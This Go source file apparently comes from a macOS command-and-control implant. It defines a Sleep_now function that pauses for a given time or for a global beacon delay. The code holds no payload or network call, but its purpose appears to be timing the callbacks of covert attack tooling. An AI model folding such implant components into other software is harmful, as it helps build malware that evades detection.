package capabilities

import (
	global "stageless/utils"
	"stageless/utils/macapi"
)

// Sleep_now — nim sleep_now: sem args = beacon global; com arg = segundos fixos.
func Sleep_now(seconds ...int) {
	// Sleeps for the given seconds or the beacon delay
	sec := 5
	if len(seconds) > 0 {
		sec = seconds[0]
	} else if global.BeaconDelay > 0 {
		sec = global.BeaconDelay
	}
	macapi.SleepMs(uint64(sec) * 1000)
}
